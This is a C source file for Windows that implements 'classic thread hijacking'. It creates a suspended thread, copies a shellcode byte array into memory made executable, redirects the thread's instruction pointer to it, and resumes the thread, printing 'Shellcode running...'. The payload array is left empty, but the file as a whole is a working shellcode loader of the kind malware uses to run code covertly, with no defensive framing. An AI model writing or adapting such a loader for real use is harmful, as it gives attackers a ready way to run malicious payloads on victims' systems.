#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <processthreadsapi.h>
#include <memory.h>
#include <string.h>

void dummyFunc() {
    while (1) { Sleep(1000); }
}

BOOL RunViaClassicThreadHijacking(PBYTE payload, SIZE_T payload_size, HANDLE HThread){
    
    PVOID PayloadAddress = VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!PayloadAddress) return FALSE;

    memcpy(PayloadAddress, payload, payload_size);

    DWORD dwOldProtection = 0;
    if (!VirtualProtect(PayloadAddress, payload_size, PAGE_EXECUTE_READ, &dwOldProtection)) return FALSE;
    

    CONTEXT Threadctx={ .ContextFlags = CONTEXT_CONTROL};
    
    if (!GetThreadContext(HThread, &Threadctx)) {
    VirtualFree(PayloadAddress, 0, MEM_RELEASE);
    return FALSE;
    }

    Threadctx.Rip = (DWORD64)PayloadAddress;
    if (!SetThreadContext(HThread, &Threadctx)) {
        VirtualFree(PayloadAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    return TRUE;
    
}

int main(){
    HANDLE HThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)dummyFunc,
        NULL,
        CREATE_SUSPENDED,
        NULL);

    if (!HThread) {
        printf("CreateThread failed: %lu\n", GetLastError());
        return 1;
    }

BYTE payload[] = {
    
    };

    SIZE_T payloadsize = sizeof(payload);

    if (!RunViaClassicThreadHijacking(payload, payloadsize, HThread)) {
        printf("Hijack failed\n");
        TerminateThread(HThread, 0);
        CloseHandle(HThread);
        return 1;
    }

    //RunViaClassicThreadHijacking(payload, payloadsize, HThread);

    ResumeThread(HThread);

    printf("Shellcode running...\n");
    WaitForSingleObject(HThread, INFINITE);
    CloseHandle(HThread);

    return 0;
}